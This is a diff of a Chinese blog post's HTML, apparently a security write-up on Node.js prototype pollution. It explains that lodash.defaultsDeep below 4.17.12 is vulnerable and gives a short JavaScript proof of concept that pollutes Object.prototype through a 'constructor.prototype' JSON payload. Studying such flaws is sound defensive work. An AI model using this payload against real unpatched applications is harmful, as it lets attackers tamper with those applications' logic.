@@ -9,12 +9,12 @@
         <meta name="keywords" content="其他" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="触发污染点0x01 lodash.defaultsDeep方法造成的原型链污染影响lodash&lt;4.17.12所有版本，4.17.12之后修复，除了原本过滤的__proto__，新增过滤了constructor以防止污染全局对象  123456var merge &#x3D; require(&amp;#x27;lodash&amp;#x27;).defaultsDeep;var payload &#x3D; &amp;#x27;&amp;#">
+    <meta name="description" content="触发污染点0x01 lodash.defaultsDeep方法造成的原型链污染">
 <meta property="og:type" content="article">
 <meta property="og:title" content="nodejs原型链污染">
 <meta property="og:url" content="https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
 <meta property="og:site_name" content="npC4t&#39;s Blog">
-<meta property="og:description" content="触发污染点0x01 lodash.defaultsDeep方法造成的原型链污染影响lodash&lt;4.17.12所有版本，4.17.12之后修复，除了原本过滤的__proto__，新增过滤了constructor以防止污染全局对象  123456var merge &#x3D; require(&amp;#x27;lodash&amp;#x27;).defaultsDeep;var payload &#x3D; &amp;#x27;&amp;#">
+<meta property="og:description" content="触发污染点0x01 lodash.defaultsDeep方法造成的原型链污染">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_13-59-07.png">
 <meta property="og:image" content="https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_15-03-06.png">
@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_16-36-54.png">
 <meta property="og:image" content="https://123-prog.github.io/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_16-53-01.png">
 <meta property="article:published_time" content="2021-10-03T02:29:52.000Z">
-<meta property="article:modified_time" content="2021-10-03T08:53:58.405Z">
+<meta property="article:modified_time" content="2021-10-03T14:46:06.064Z">
 <meta property="article:author" content="npC4t">
 <meta property="article:tag" content="其他">
 <meta name="twitter:card" content="summary">
@@ -458,7 +458,9 @@
             
         
         
-            <h2 id="触发污染点"><a href="#触发污染点" class="headerlink" title="触发污染点"></a>触发污染点</h2><h3 id="0x01-lodash-defaultsDeep方法造成的原型链污染"><a href="#0x01-lodash-defaultsDeep方法造成的原型链污染" class="headerlink" title="0x01 lodash.defaultsDeep方法造成的原型链污染"></a>0x01 lodash.defaultsDeep方法造成的原型链污染</h3><p>影响lodash&lt;4.17.12所有版本，4.17.12之后修复，除了原本过滤的<code>__proto__</code>，新增过滤了<code>constructor</code>以防止污染全局对象</p>
+            <h2 id="触发污染点"><a href="#触发污染点" class="headerlink" title="触发污染点"></a>触发污染点</h2><h3 id="0x01-lodash-defaultsDeep方法造成的原型链污染"><a href="#0x01-lodash-defaultsDeep方法造成的原型链污染" class="headerlink" title="0x01 lodash.defaultsDeep方法造成的原型链污染"></a>0x01 lodash.defaultsDeep方法造成的原型链污染</h3><a id="more"></a>
+
+<p>影响lodash&lt;4.17.12所有版本，4.17.12之后修复，除了原本过滤的<code>__proto__</code>，新增过滤了<code>constructor</code>以防止污染全局对象</p>
 <p><img src="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/Snipaste_2021-10-03_13-59-07.png"></p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).defaultsDeep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;hack&quot;:&quot;whoami&quot;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">merge(&#123;&#125;,<span class="built_in">JSON</span>.parse(payload));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;sss&#x27;</span>);</span><br></pre></td></tr></table></figure>
 <h3 id="0x02-lodash-merge，lodash-mergeWith"><a href="#0x02-lodash-merge，lodash-mergeWith" class="headerlink" title="0x02 lodash.merge，lodash.mergeWith"></a>0x02 lodash.merge，lodash.mergeWith</h3><p>lodash&lt;4.17.5</p>
